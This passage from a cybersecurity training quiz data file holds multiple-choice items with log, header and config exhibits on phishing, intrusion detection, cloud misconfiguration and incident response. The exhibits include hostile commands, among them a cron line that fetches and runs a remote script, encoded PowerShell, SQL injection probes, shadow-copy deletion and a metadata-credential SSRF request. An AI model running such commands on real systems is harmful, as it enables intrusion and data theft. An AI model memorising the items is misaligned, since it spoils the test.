    q: "An AI system makes recommendations that affect customers' access to services. Which governance control is most important?",
    options: ["Full automation with no human review so that decisions are faster and cheaper","Human oversight, a route to appeal, and testing and monitoring of outcomes","Keeping the model's behaviour secret from the people who are affected by it","Relying on the vendor's statement that the model is fair and accurate"],
    correct: 1, why: "Decisions affecting people need oversight, a way to challenge outcomes and ongoing testing for accuracy and bias.",
    hint: "Someone must be able to check and challenge the outcome."
  },
  {
    id: 198, rank: 4, topic: "Destructive Malware Response", difficulty: "EXPERT",
    q: "Analysts identify destructive wiper malware spreading in the network. What should the incident lead prioritise?",
    options: ["Rapid isolation of affected segments, protection of backups and identity systems, and preparation for rebuild","Waiting to see whether the malware stops on its own","Paying a ransom to receive a decryption key","Restoring data onto systems that are still connected to the infected network"],
    correct: 0, why: "Wipers destroy data rather than seeking payment, so stopping spread, protecting backups and identity and planning rebuilds come first.",
    hint: "There is no key to buy back; protect what survives."
  },
  {
    id: 199, rank: 4, topic: "Detection Coverage", difficulty: "EXPERT",
    q: "A CISO wants to know how well detections cover the techniques attackers are likely to use. What is the best approach?",
    options: ["Count how many rules exist and assume more rules mean better coverage","Ask the vendor whether its product covers everything that attackers might do","Map detections to attacker techniques, test them and rank the gaps","Assume coverage is complete because no alerts were raised last month"],
    correct: 2, why: "Mapping and testing detections against attacker techniques shows real coverage and highlights the gaps that matter most.",
    hint: "Silence and rule counts do not prove coverage."
  },
  {
    id: 200, rank: 4, topic: "Multi-Cloud Governance", difficulty: "EXPERT",
    q: "An organisation uses several cloud providers, with different teams managing each. What is the most effective way to keep security consistent?",
    options: ["Let every team apply whichever controls it prefers because each provider is different","Standardise on the weakest provider's features so that nothing differs between clouds","Avoid monitoring any cloud to prevent differences from being noticed by auditors or regulators","Common policies, central visibility and provider-specific guardrails owned by a platform team"],
    correct: 3, why: "A shared policy and visibility layer, implemented through provider-specific guardrails, keeps controls consistent despite platform differences.",
    hint: "Consistent outcomes need common policy, not identical tools."
  },
  {
    id: 201, rank: 0, topic: "Lookalike Domains", difficulty: "BEGINNER",
    exhibit: "REAL SITE: https://www.examplebank.com",
    q: "Which of these web addresses is most likely a fake version of the bank's real site?",
    options: ["https://www.examplebank.com/login","https://www.examp1ebank.com/login","https://online.examplebank.com/accounts","https://examplebank.com/help"],
    correct: 1, why: "Attackers register lookalike domains that swap similar characters, such as the digit 1 for the letter l, hoping people will not notice.",
    hint: "Read the domain name character by character."
  },
  {
    id: 202, rank: 0, topic: "Double File Extensions", difficulty: "BEGINNER",
    exhibit: "ATTACHMENT: Invoice_4471.pdf.exe\nSIZE: 1.2 MB\nFROM: accounts@supplier-billing.example",
    q: "What does this attachment name suggest?",
    options: ["A normal PDF document that can be opened safely in any common PDF reader","A scanned image of the invoice that is safe to open on any mobile phone","A compressed archive that cannot run any code when it is opened","An executable program disguised as a PDF using a double extension"],
    correct: 3, why: "Windows may hide the final extension, so a program ending in .exe can look like a document. Only the last extension decides what the file is.",
    hint: "The last extension is the one that counts."
  },
  {
    id: 203, rank: 0, topic: "Certificate Warnings", difficulty: "BEGINNER",
    exhibit: "BROWSER MESSAGE: Your connection is not private\nERROR: NET::ERR_CERT_COMMON_NAME_INVALID\nSITE: hr-portal.company.example\nCERTIFICATE ISSUED TO: *.other-host.example",
    q: "You see this browser warning when opening the company HR portal. What should you do?",
    options: ["Stop, do not enter your credentials and report it to IT so the certificate can be checked","Click 'Proceed anyway' because you recognise the portal's name","Turn off the browser's security warnings in the settings menu","Try again on a different Wi-Fi network and ignore the message"],
    correct: 0, why: "A name mismatch can mean the site is misconfigured or that someone is intercepting the connection, so credentials should not be entered until IT has checked.",
    hint: "A warning on a login page is a reason to stop."
  },
  {
    id: 204, rank: 0, topic: "Link Hover Check", difficulty: "BEGINNER",
    exhibit: "EMAIL BODY: Click here to view your invoice\nLINK TEXT: Click here to view your invoice\nSTATUS BAR ON HOVER: http://198.51.100.23/invoice.php",
    q: "What does the link's real destination suggest?",
    options: ["The link is safe because invoices are normally delivered as PHP files by suppliers","The link text and real destination match, so the message can be trusted","The destination is a bare IP address, not the sender's site","The link is encrypted end to end so the sender's identity is already proven"],
    correct: 2, why: "A link that leads to a raw IP address instead of the sender's own domain is a common sign of a malicious or compromised destination.",
    hint: "Compare where the link claims to go with where it really goes."
  },
  {
    id: 205, rank: 1, topic: "Email Header Analysis", difficulty: "INTERMEDIATE",
    exhibit: "FROM: Parcel Service <noreply@parcel-delivery.example>\nREPLY-TO: refunds@mail-collect.example\nSUBJECT: Redelivery fee required\nRECEIVED-FROM: mail.shipping-update.example (203.0.113.45)\nSPF: fail (smtp.mailfrom=billing@shipping-update.example)\nDKIM: none\nDMARC: fail (p=none, header.from=parcel-delivery.example)\n\nYour parcel could not be delivered. Pay a £1.99 redelivery fee within 24 hours.\n\nLINK: https://parcel-fee.example/pay",
    q: "Based on these message headers, what is the best assessment?",
    options: ["Legitimate, because the display name and From address appear to belong to the parcel service","Legitimate but low risk, because the DMARC policy is none so the message was accepted","Likely spoofed: SPF and DMARC failed, there is no DKIM and the Reply-To differs","Cannot be assessed unless someone opens the attachment"],
    correct: 2, why: "SPF and DMARC failures, no DKIM signature and a Reply-To on an unrelated domain point to a spoofed message. A p=none policy only means the failure was not enforced.",
    hint: "Check authentication results and whether the reply address matches the sender."
  },
  {
    id: 206, rank: 1, topic: "Windows Logon Events", difficulty: "INTERMEDIATE",
    exhibit: "WINDOWS SECURITY LOG (excerpt)\n4625 FAILED logon  user=administrator  src=198.51.100.77  type=3  (212 times in 4 minutes)\n4625 FAILED logon  user=admin  src=198.51.100.77  type=3\n4625 FAILED logon  user=backup  src=198.51.100.77  type=3\n4624 SUCCESS logon user=backup  src=198.51.100.77  type=3",
    q: "What is the most likely activity and the best first response?",
    options: ["A password-guessing attack that has succeeded for 'backup'; disable the account, block the source and investigate that session","Normal user lockouts; reset every password tomorrow","A scheduled backup job; no action is needed","A denial-of-service attack; add network bandwidth"],
    correct: 0, why: "Many failed network logons from one source followed by a success on one of the guessed accounts indicates a successful brute-force or spraying attempt that needs containment.",
    hint: "Look at what happens right after the burst of failures."
  },
  {
    id: 207, rank: 1, topic: "SSH Brute Force", difficulty: "INTERMEDIATE",
    exhibit: "LINUX /var/log/auth.log (excerpt)\nFailed password for invalid user oracle from 203.0.113.9 port 51022 ssh2\nFailed password for invalid user test from 203.0.113.9 port 51030 ssh2\nFailed password for root from 203.0.113.9 port 51041 ssh2\n(repeats about 600 times in 10 minutes)",
    q: "Which control best reduces this risk on an internet-facing server?",
    options: ["Move the server to a larger virtual machine so that it can handle the extra login attempts","Increase the log retention period to 90 days","Rename the root account only","Disable SSH password logins, use keys and block repeated failures"],
    correct: 3, why: "Key-based authentication removes the value of password guessing, and automatic blocking limits the noise and the chance of a lucky guess.",
    hint: "Remove the thing the attacker is guessing."
  },
  {
    id: 208, rank: 1, topic: "Web Log Analysis", difficulty: "INTERMEDIATE",
    exhibit: "WEB SERVER ACCESS LOG (excerpt)\n203.0.113.50 \"GET /products?id=7 HTTP/1.1\" 200 5123\n203.0.113.50 \"GET /products?id=7' OR '1'='1 HTTP/1.1\" 500 312\n203.0.113.50 \"GET /products?id=7 UNION SELECT NULL,NULL-- HTTP/1.1\" 500 298",
    q: "What does this web server activity most likely represent?",
    options: ["Normal customers browsing the catalogue through a mobile application","SQL injection probing of the id parameter","A misconfigured load balancer sending malformed health checks to the site","A harmless search engine crawler indexing the product pages in order"],
    correct: 1, why: "Quote characters, OR conditions and UNION SELECT in a parameter, followed by server errors, are classic signs of SQL injection probing.",
    hint: "Look at what has been added to the id value."
  },
  {
    id: 209, rank: 1, topic: "SPF Record Review", difficulty: "INTERMEDIATE",
    exhibit: "DNS TXT RECORD\nv=spf1 include:_spf.mailvendor.example +all",
    q: "What is the problem with this SPF record?",
    options: ["+all authorises any server to send as the domain, so SPF protects nothing","SPF records must never include any third-party mail vendor under any circumstances","The record should be published as an A record rather than as a TXT record at the root","The v=spf1 prefix is only required for senders that use IPv6"],
    correct: 0, why: "The +all mechanism passes every sender, which defeats the purpose of SPF. A restrictive ending such as -all or ~all is normally used.",
    hint: "Look at the last mechanism in the record."
  },
  {
    id: 210, rank: 1, topic: "Outbound Traffic Review", difficulty: "INTERMEDIATE",
    exhibit: "FIREWALL LOG (allowed outbound)\n10.0.4.22 -> 203.0.113.80:4444 TCP 7 MB sent 02:13\n10.0.4.22 -> 203.0.113.80:4444 TCP 6 MB sent 02:43\n10.0.4.22 -> 203.0.113.80:4444 TCP 7 MB sent 03:13",
    q: "A workstation sends similar volumes to the same external host every 30 minutes overnight. What is the best next step?",
    options: ["Ignore it, because the traffic was allowed by the firewall policy so it must be legitimate","Block its MAC address and close the ticket","Isolate the host and investigate the process and destination","Restart the firewall to clear its state tables"],
    correct: 2, why: "Regular, automated transfers to an unusual port at night are consistent with beaconing or exfiltration, so the host should be contained and examined.",
    hint: "Regular timing is a clue."
  },
  {
    id: 211, rank: 1, topic: "Hash Intelligence Match", difficulty: "INTERMEDIATE",
    exhibit: "EDR ALERT\nSHA-256: 9f2c4e7a...a41e\nHOSTS: LAPTOP-014, LAPTOP-027, LAPTOP-033\nTHREAT INTELLIGENCE VERDICT: known infostealer",
    q: "What should the analyst do first?",
    options: ["Delete the file on each laptop and close the alert","Isolate the three laptops, collect the file and process data, check for stolen credentials and reset the affected accounts","Wait for the antivirus product to quarantine the file on its own","Email the hash to all staff and ask them to search their devices"],
    correct: 1, why: "An infostealer has probably already taken credentials, so responders should contain the hosts, gather evidence and reset exposed accounts rather than only deleting the file.",
    hint: "Assume the credentials may already be gone."
  },
  {
    id: 212, rank: 1, topic: "CVSS Vector Reading", difficulty: "INTERMEDIATE",
    exhibit: "SCANNER FINDING\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    q: "What does this CVSS vector tell you?",
    options: ["It needs physical access and an authenticated user to click a link before it works","It affects only confidentiality and can be ignored if the host is patched monthly","It is a local-only vulnerability that requires administrator rights to trigger it","Network-exploitable, low complexity, no privileges or user interaction needed"],
    correct: 3, why: "AV:N means network attack vector, AC:L low complexity, PR:N and UI:N no privileges or user action, with high impact on confidentiality, integrity and availability.",
    hint: "Read AV, AC, PR and UI first."
  },
  {
    id: 213, rank: 1, topic: "Deceptive Link Domains", difficulty: "INTERMEDIATE",
    exhibit: "FROM: Microsoft 365 Team <no-reply@m365-notify.example>\nSUBJECT: Password expires today\n\nYour password expires in 2 hours. Select the link below to keep your current password.\n\nLINK TEXT: https://login.microsoftonline.com\nLINK TARGET: https://login.microsoftonline.com.secure-verify.example/session",
    q: "Why is the link in this email dangerous even though the visible text shows a genuine Microsoft address?",
    options: ["The registered domain is secure-verify.example; the Microsoft name is only a subdomain","The visible text is too short to be a valid address, so the browser will block the page automatically","Links inside emails always download a file instead of opening a web page","The link uses HTTPS, and HTTPS pages are always fake"],
    correct: 0, why: "The part of the address just before the final domain suffix decides who controls the site. Here that is secure-verify.example, not Microsoft.",
    hint: "Read the address from right to left."
  },
  {
    id: 214, rank: 1, topic: "TLS Configuration Review", difficulty: "INTERMEDIATE",
    exhibit: "TLS SCAN REPORT\nProtocols: TLS 1.0, TLS 1.1, TLS 1.2\nCipher suites include RC4 and 3DES\nCertificate: valid, SHA-256, expires in 11 months",
    q: "What is the key finding in this TLS scan report?",
    options: ["The certificate expires in eleven months, which is far too soon to be acceptable","TLS 1.2 should be turned off first","Disable TLS 1.0/1.1 and weak ciphers such as RC4 and 3DES","The SHA-256 signature algorithm on the certificate is considered insecure"],
    correct: 2, why: "TLS 1.0 and 1.1 and ciphers such as RC4 and 3DES are deprecated or weak, while the certificate itself is healthy.",
    hint: "Separate the certificate from the protocol and cipher settings."
  },
  {
    id: 215, rank: 2, topic: "Office Spawning PowerShell", difficulty: "ADVANCED",
    exhibit: "EDR PROCESS TREE\nOUTLOOK.EXE\n  WINWORD.EXE (invoice.docm)\n    cmd.exe /c powershell -enc JABzAD0A...\n      powershell.exe (outbound connection to 203.0.113.99:443)",
    q: "What is the most likely explanation and best immediate action for this process tree?",
    options: ["A normal document-processing task, so the alert can be closed without further investigation","A document that refreshes itself, so the file should be added to the allowlist","Antivirus scanning the attachment, so the analyst should wait for it to finish","A malicious macro launching PowerShell; isolate and preserve evidence"],
    correct: 3, why: "An Office document spawning a command shell that runs encoded PowerShell and connects outbound is a classic malicious-macro chain and warrants containment.",
    hint: "Think about what Word should never need to launch."
  },
  {
    id: 216, rank: 2, topic: "Encoded Command Analysis", difficulty: "ADVANCED",
    exhibit: "COMMAND LINE OBSERVED ON A SERVER\npowershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0A...",
    q: "Which step best helps an analyst understand this command safely?",
    options: ["Paste the encoded string into a public website that will run the command and show its output","Decode the Base64 text in an isolated environment and review the script","Run it again on the server with logging turned off","Delete the parent process without examining it first"],
    correct: 1, why: "The payload can be decoded and read without executing it, ideally in an isolated analysis environment, so that behaviour is understood without risk.",
    hint: "Read it; do not run it."
  },
  {
    id: 217, rank: 2, topic: "Kerberos Ticket Requests", difficulty: "ADVANCED",
    exhibit: "DOMAIN CONTROLLER SECURITY LOG (excerpt)\nEvent 4769 (Kerberos service ticket requested) Account: jsmith Service: MSSQLSvc/db01 Ticket encryption: 0x17 (RC4)\n(45 similar requests for different service accounts within 2 minutes, all from one workstation)",
    q: "What does this pattern of Kerberos ticket requests most likely indicate?",
    options: ["Service-ticket requests for many service accounts using RC4, consistent with Kerberoasting; investigate the workstation and review service-account passwords","Normal user authentication to file shares","A time-synchronisation problem on the workstation","Password expiry notifications being sent to users"],
    correct: 0, why: "A burst of service-ticket requests for many service accounts using the weaker RC4 type suggests an attempt to harvest tickets for offline cracking.",
    hint: "Look at the number of different services requested in a short time."
  },
  {
    id: 218, rank: 2, topic: "Over-Permissive IAM Policy", difficulty: "ADVANCED",
    exhibit: "IAM POLICY (web application role)\n{\"Effect\":\"Allow\",\"Action\":\"s3:*\",\"Resource\":\"*\"}",
    q: "The application only reads objects from one bucket named reports-prod. What is the best change to this policy?",
    options: ["Add a condition so that the role can only be used during weekday working hours","Keep the policy as it is and enable MFA delete on every bucket in the account","Limit it to s3:GetObject on the reports-prod bucket only","Move the application to a larger instance type"],
    correct: 2, why: "Least privilege means granting only the read action on the one bucket the application needs, rather than every S3 action on every resource.",
    hint: "Match the permission to what the application really does."
  },
  {
    id: 219, rank: 2, topic: "Public Bucket Policy", difficulty: "ADVANCED",
    exhibit: "STORAGE BUCKET POLICY (excerpt)\n\"Principal\": \"*\", \"Action\": \"s3:GetObject\", \"Resource\": \"arn:aws:s3:::hr-exports/*\"",
    q: "What is the issue with this bucket policy?",
    options: ["The policy blocks every user, including administrators, from reading the objects","Any anonymous internet user can read every object","The policy allows only users in the same account to read the objects in the bucket","The policy only allows uploads, so reads are impossible for all of the users"],
    correct: 1, why: "A wildcard principal with GetObject on the bucket's objects makes them readable by anyone on the internet unless other controls block it.",
    hint: "What does Principal * mean?"
  },
  {
    id: 220, rank: 2, topic: "External Scan Triage", difficulty: "ADVANCED",
    exhibit: "EXTERNAL SCAN RESULTS\n22/tcp open ssh (key authentication only)\n80/tcp open http (redirects to 443)\n443/tcp open https\n9200/tcp open elasticsearch (no authentication required)",
    q: "Which finding in these scan results is the most urgent?",
    options: ["SSH is open, which means the server is certain to be compromised within the day","HTTPS on port 443 is open, which proves the server has been breached","Port 80 is open, so the whole website must be taken offline","Unauthenticated Elasticsearch exposed to the internet, risking data exposure"],
    correct: 3, why: "An internet-exposed data store with no authentication can allow anyone to read or modify data, whereas the other services are normal or protected.",
    hint: "Which service lets anyone in without credentials?"
  },
  {
    id: 221, rank: 2, topic: "JWT Algorithm Validation", difficulty: "ADVANCED",
    exhibit: "JWT HEADER (decoded): {\"alg\":\"none\",\"typ\":\"JWT\"}\nSIGNATURE: (empty)\nAPI RESPONSE: 200 OK (access granted)",
    q: "What is the vulnerability and the fix?",
    options: ["Tokens are too short, so they should be made longer","The server should send tokens over HTTP instead of HTTPS","The server accepts unsigned tokens; it should enforce a fixed set of allowed algorithms and always verify the signature","The typ field must be set to JWS for the token to be valid"],
    correct: 2, why: "Accepting alg=none lets anyone forge tokens. The server must decide which algorithms are allowed and verify signatures rather than trusting the token's header.",
    hint: "Who decides how the token is verified?"
  },
  {
    id: 222, rank: 2, topic: "CORS Misconfiguration", difficulty: "ADVANCED",
    exhibit: "HTTP RESPONSE HEADERS (api.company.example)\nAccess-Control-Allow-Origin: https://evil.example\nAccess-Control-Allow-Credentials: true\nNOTE: the origin value is copied from the request's Origin header",
    q: "What is the risk of these response headers?",
    options: ["Any website can read authenticated responses on behalf of logged-in users","Browsers will refuse every request to the API, making it unavailable to all users","Cookies will never be sent by browsers, so users cannot stay logged in at all","The response will be cached forever by every browser"],
    correct: 0, why: "Reflecting any origin while allowing credentials lets a malicious site make authenticated requests and read the results from a victim's browser.",
    hint: "The server is trusting whatever origin asks."
  },
  {
    id: 223, rank: 2, topic: "SQL Injection Remediation", difficulty: "ADVANCED",
    exhibit: "CODE (excerpt)\nquery = \"SELECT * FROM users WHERE name = '\" + username + \"' AND active = 1\"",
    q: "Which change best removes the vulnerability in this code?",
    options: ["Strip every space character from the username before building the query string","Convert the username to lowercase","Hide the database error messages from the user","Use parameterised queries so input is treated as data"],
    correct: 3, why: "Parameterised queries keep user input separate from SQL code, which prevents it from altering the query structure.",
    hint: "Keep data and code apart."
  },
  {
    id: 224, rank: 2, topic: "YARA Rule Limits", difficulty: "ADVANCED",
    exhibit: "YARA RULE (excerpt)\nstrings:\n  $a = \"AutoOpen\"\n  $b = \"powershell\" nocase\ncondition:\n  all of them",
    q: "Which limitation should the analyst expect from this YARA rule?",
    options: ["It can miss obfuscation and match legitimate files, so test it","It will detect every malicious document in existence without any false positives","It scans network traffic in real time and will block any connection it matches","It automatically removes the macros from any document that it flags"],
    correct: 0, why: "String-based rules are easy to evade with obfuscation and can match benign files, so they need testing against clean and malicious samples.",
    hint: "Simple string rules are brittle."
  },
  {
    id: 225, rank: 2, topic: "Cron Persistence", difficulty: "ADVANCED",
    exhibit: "FILE: /etc/cron.d/sysupdate (created after the intrusion)\n*/5 * * * * root curl -s http://203.0.113.9/u.sh | sh",
    q: "You find this file on a compromised web server. What is the correct interpretation?",
    options: ["A standard security update job installed by the operating system distribution package","A log rotation entry that was installed by the web server software package earlier","A persistence mechanism that fetches and runs remote code every five minutes","A scheduled backup of the database to remote storage"],
    correct: 2, why: "A root cron job that repeatedly downloads and pipes a remote script into a shell is a persistence and remote-execution mechanism.",
    hint: "Look at what runs and how often."
  },
  {
    id: 226, rank: 2, topic: "DNS Beaconing", difficulty: "ADVANCED",
    exhibit: "DNS QUERY LOG (one host, domain update.cdn-sync.example)\n02:00:01  TXT  a8f3k2x9q1...update.cdn-sync.example\n02:05:02  TXT  p0z7m4c8w2...update.cdn-sync.example\n02:10:01  TXT  h5t1v6b3n9...update.cdn-sync.example\n(continues every 5 minutes, 24 hours a day)",
    q: "What is the most likely explanation for this DNS activity?",
    options: ["A user refreshing a web page every few minutes","Automated beaconing or DNS tunnelling to the domain; block it and investigate the host","A scheduled backup job reporting its status","Normal time-synchronisation traffic"],
    correct: 1, why: "Regular timing and long random-looking subdomains in TXT queries suggest data being carried or commands being polled over DNS.",
    hint: "Regular intervals and long random labels are unusual."
  },
  {
    id: 227, rank: 3, topic: "Security Group Exposure", difficulty: "EXPERT",
    exhibit: "TERRAFORM (excerpt)\nresource \"aws_security_group_rule\" \"db\" {\n  type        = \"ingress\"\n  from_port   = 5432\n  to_port     = 5432\n  protocol    = \"tcp\"\n  cidr_blocks = [\"0.0.0.0/0\"]\n}",
    q: "How should the architect fix this security group rule?",
    options: ["Change the protocol to UDP so that the rule no longer matches PostgreSQL traffic","Allow 0.0.0.0/0 only during business hours using a scheduled security group rule","Rename the resource to make it less obvious to scanners","Allow only the application tier's security group and keep the database private"],
    correct: 3, why: "Databases should accept connections only from the tiers that need them and should not sit on a publicly reachable network.",
    hint: "Limit who may connect, not when."
  },
  {
    id: 228, rank: 3, topic: "Container Image Hygiene", difficulty: "EXPERT",
    exhibit: "DOCKERFILE (excerpt)\nFROM node:latest\nENV API_KEY=sk_live_51H...\nCOPY . /app\nUSER root",
    q: "Which improvement to this Dockerfile addresses the most serious problem?",
    options: ["Inject the key at runtime from a secrets manager and stop baking it into the image","Rename the API_KEY variable and the other environment variables so that scanners cannot recognise them","Switch the base image to the latest tag of a different distribution","Add a comment explaining that the key is for production use only"],
    correct: 0, why: "A secret baked into an image can be read by anyone who can pull it. It should be supplied at runtime from a secrets manager, with a pinned base image and a non-root user.",
    hint: "Secrets should not live inside the image."
  },
  {
    id: 229, rank: 3, topic: "CI Pipeline Trust", difficulty: "EXPERT",
    exhibit: "CI PIPELINE (excerpt)\non: pull_request_target\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with: { ref: ${{ github.event.pull_request.head.sha }} }\n      - run: ./build.sh    # runs with repository secrets",
    q: "What is the architectural risk in this pipeline configuration?",
    options: ["Pull requests cannot be built at all with this configuration","Build logs are stored for too long","Untrusted code from forks runs with access to repository secrets and a privileged token, so a malicious pull request could steal them","The checkout action has been deprecated and no longer works"],
    correct: 2, why: "This trigger runs in the context of the base repository, so checking out and running untrusted pull request code exposes secrets and permissions.",
    hint: "Who wrote the code that is being run with the secrets?"
  },
  {
    id: 230, rank: 3, topic: "Cost-Benefit of Controls", difficulty: "EXPERT",
    exhibit: "RISK ASSESSMENT DATA\nAsset value: £800,000\nExposure factor: 25%\nAnnual rate of occurrence (ARO): 0.5\nProposed control: £60,000 per year; reduces ARO to 0.1",
    q: "Based on this data, which conclusion is correct?",
    options: ["Not cost-effective, because the control's annual cost is higher than the remaining annual loss","Cost-effective: it cuts expected annual loss by £80,000 for £60,000","The annualised loss expectancy before the control is £200,000, so the control is essential","It must be rejected, because any risk involving an asset of this value cannot be quantified"],
    correct: 1, why: "SLE is £200,000. ALE falls from £100,000 (0.5 x £200,000) to £20,000 (0.1 x £200,000), a saving of £80,000 for a £60,000 annual cost.",
    hint: "Compare the reduction in expected loss with the cost."
  },
  {
    id: 231, rank: 3, topic: "Log Retention Gap Analysis", difficulty: "EXPERT",
    exhibit: "REQUIREMENT: security logs must be retained for 12 months and protected from alteration\nCURRENT SIEM SETTINGS\n  retention_days: 90\n  index_write_access: siem-admins (can edit and delete)",
    q: "What is the correct gap assessment?",
    options: ["Compliant, because 90 days is long enough to cover a typical investigation of an incident","Compliant, because administrators are trusted staff","Non-compliant only because the SIEM is not hosted in the cloud","Retention is too short and tampering is possible: extend it and use immutable storage"],
    correct: 3, why: "Retention is 90 days against a 12-month requirement, and administrators can alter or delete the logs, so both retention and integrity controls are missing.",
    hint: "Check both the duration and the protection from change."
  },
  {
    id: 232, rank: 3, topic: "OAuth Redirect URI", difficulty: "EXPERT",
    exhibit: "OAUTH CLIENT REGISTRATION\nredirect_uri: https://*.company.example/callback",
    q: "What is the security concern with this OAuth registration?",
    options: ["A wildcard lets any controlled subdomain capture authorisation codes","OAuth does not support HTTPS callbacks, so the registration cannot work at all","Callback paths must always be '/login' for the authorisation server to accept them","The client secret will be displayed to users during sign-in"],
    correct: 0, why: "Wildcard redirect URIs allow an attacker who controls or takes over any matching subdomain to receive authorisation codes. Exact URIs should be registered.",
    hint: "Which hosts does the wildcard include?"
  },
  {
    id: 233, rank: 3, topic: "Content Security Policy", difficulty: "EXPERT",
    exhibit: "RESPONSE HEADER\nContent-Security-Policy: default-src *; script-src * 'unsafe-inline' 'unsafe-eval'",
    q: "How effective is this policy at limiting the impact of cross-site scripting?",
    options: ["Very effective, because any Content-Security-Policy header blocks all script injection","Effective, because the wildcard source list limits scripts to the site itself","Weak: it allows scripts from any source, inline and eval","Effective for scripts but it blocks every image and every stylesheet by design"],
    correct: 2, why: "Allowing every source plus unsafe-inline and unsafe-eval means injected scripts are still permitted, so the policy offers little protection.",
    hint: "Count what the policy actually forbids."
  },
  {
    id: 234, rank: 3, topic: "DMARC Rollout", difficulty: "EXPERT",
    exhibit: "DNS RECORD\n_dmarc.company.example TXT \"v=DMARC1; p=none; rua=mailto:dmarc@company.example\"",
    q: "The organisation wants to stop spoofed email using its domain. What is the best approach?",
    options: ["Switch straight to p=reject for all mail without reviewing any reports","Leave p=none, because it already blocks spoofed email","Delete the record, because DMARC is no longer needed once SPF exists","Review the aggregate reports, fix legitimate senders' SPF/DKIM alignment, then move to quarantine and reject in stages"],
    correct: 3, why: "Moving too quickly can block legitimate mail, so reports are used to find and fix legitimate senders before enforcement is raised in stages.",
    hint: "Observe first, then enforce."
  },
  {
    id: 235, rank: 3, topic: "Key Policy Separation", difficulty: "EXPERT",
    exhibit: "KMS KEY POLICY (summary)\nPrincipal: account root -> kms:*\nPrincipal: role DevOps (also used by CI jobs) -> kms:*",
    q: "A pipeline compromise would let an attacker decrypt production data. Which architectural change is best?",
    options: ["Create additional administrators for the DevOps role so that responsibility is shared widely","Separate key admin from key use and give CI only the permissions it needs","Disable automatic key rotation so that the CI jobs never have to refresh credentials","Share the key with the CI vendor"],
    correct: 1, why: "Separating who can administer a key from who can use it, and limiting CI to the specific operations it needs, reduces what a compromised pipeline can do.",
    hint: "Administration and use should not sit in the same role."
  },
  {
    id: 236, rank: 3, topic: "Account Takeover Correlation", difficulty: "EXPERT",
    exhibit: "IDENTITY EVENTS (user alice)\n09:01 Sign-in success, IP 203.0.113.5 (new country)\n09:03 MFA method added\n09:05 Mailbox rule created: forward all mail to an external address",
    q: "Which detection logic best fits this sequence of events?",
    options: ["Alert only when a user has more than ten failed logins in an hour, as that is the only sign","Alert on every mailbox rule","Correlate a new-location sign-in with MFA change and forwarding rule in a short window","Alert on every successful sign-in during working hours"],
    correct: 2, why: "Individually these events may be benign, but together within minutes they form a strong account-takeover pattern, which correlation can detect.",
    hint: "The sequence matters more than any single event."
  },
  {
    id: 237, rank: 3, topic: "Conditional Access Baseline", difficulty: "EXPERT",
    exhibit: "CONDITIONAL ACCESS POLICY (excerpt)\n  users: all   apps: all   conditions: none\n  grant: require MFA\n  exclusions: 2 emergency 'break-glass' accounts",
    q: "What is the correct assessment of this conditional access policy?",
    options: ["A reasonable baseline, provided the break-glass accounts are strongly protected, monitored and trigger an alert on every use","Dangerous, because MFA should never be required for all users","Invalid, because a policy cannot exclude any account","Pointless, because MFA only works on mobile applications"],
    correct: 0, why: "Requiring MFA broadly is a sound baseline. Emergency accounts are normally excluded to prevent lockout, so they need strong protection and alerting on use.",
    hint: "Emergency accounts are a deliberate exception that needs compensating controls."
  },
  {
    id: 238, rank: 3, topic: "Syslog Transport Risk", difficulty: "EXPERT",
    exhibit: "LOG TRANSPORT DESIGN\nSource: perimeter firewalls\nDestination: SIEM collector\nProtocol: syslog over UDP, port 514\nPath: across the WAN",
    q: "Which risk should the architect address in this log transport design?",
    options: ["The logs will always be too large for any SIEM to ingest, whatever compression is used","UDP syslog automatically encrypts and signs each message, so nothing needs changing","Syslog is unable to carry firewall events, so the SIEM will receive nothing at all","Logs can be lost, read or forged in transit"],
    correct: 3, why: "UDP syslog has no delivery guarantee, encryption or authentication, so logs can be dropped, observed or spoofed. TLS-protected, reliable transport is preferable.",
    hint: "What does plain UDP not provide?"
  },
  {
    id: 239, rank: 4, topic: "Cloud Account Compromise Response", difficulty: "EXPERT",
    exhibit: "CLOUDTRAIL EVENTS (IAM user ci-deploy)\n02:11 ConsoleLogin MFAUsed=No src=198.51.100.200\n02:13 CreateAccessKey for ci-deploy\n02:15 PutUserPolicy AdministratorAccess on ci-deploy\n02:20 RunInstances 24 x GPU instances in a new region",
    q: "What should the incident lead do first?",
    options: ["Wait for finance to notice the unusual charges before taking any action against the user","Disable the user and keys, revoke sessions, stop the instances and preserve logs","Delete the trail so that the attacker cannot read it","Increase the instance quota so that the workload can finish"],
    correct: 1, why: "The sequence shows credential misuse, new persistence and resource abuse, so access must be revoked and resources stopped while evidence is preserved.",
    hint: "Contain access first, and keep the evidence."
  },
  {
    id: 240, rank: 4, topic: "Ransomware Precursors", difficulty: "EXPERT",
    exhibit: "EDR ALERT (file server)\nvssadmin.exe delete shadows /all /quiet\nbcdedit /set {default} recoveryenabled no\n(followed by mass file renaming with a new extension)",
    q: "What is the most appropriate immediate action for this alert?",
    options: ["Wait until the renaming has finished so that the full impact of the attack can be measured","Reboot the server immediately to clear the running process and then check the files again","Isolate affected hosts now, preserve evidence and protect backups","Delete the shadow copy utility from the server and restart the file-sharing service"],
    correct: 2, why: "Deleting shadow copies and disabling recovery are typical ransomware preparation steps, so speed of isolation and protection of backups matter most.",
    hint: "Stop the spread before measuring the damage."
  },
  {
    id: 241, rank: 4, topic: "Metadata Service Protection", difficulty: "EXPERT",
    exhibit: "WEB APPLICATION OUTBOUND REQUEST LOG\nFEATURE: the application fetches user-supplied URLs\nGET http://169.254.169.254/latest/meta-data/iam/security-credentials/ (initiated by the application)",
    q: "Which control best limits the cloud impact of this request?",
    options: ["Require IMDSv2, block link-local access and use least-privilege roles","Disable all outbound HTTPS from the application servers so that no URLs can be fetched","Rely on a web application firewall to hide the address of the metadata service","Increase the application's timeout"],
    correct: 0, why: "The request suggests server-side request forgery targeting instance credentials. Hardening the metadata service, restricting access and limiting role permissions reduce the impact.",
    hint: "Protect the credentials the instance can obtain."
  },
  {
    id: 242, rank: 4, topic: "Data Exfiltration Analysis", difficulty: "EXPERT",
    exhibit: "NETFLOW SUMMARY (last 24 hours)\n10.2.8.14 -> 192.0.2.77:443 TCP 38 GB out\nBASELINE FOR 10.2.8.14: under 200 MB per day\nHOST ROLE: finance file server\nDNS: 192.0.2.77 resolves to a recently registered domain",
    q: "What is the best interpretation of this traffic and the right action?",
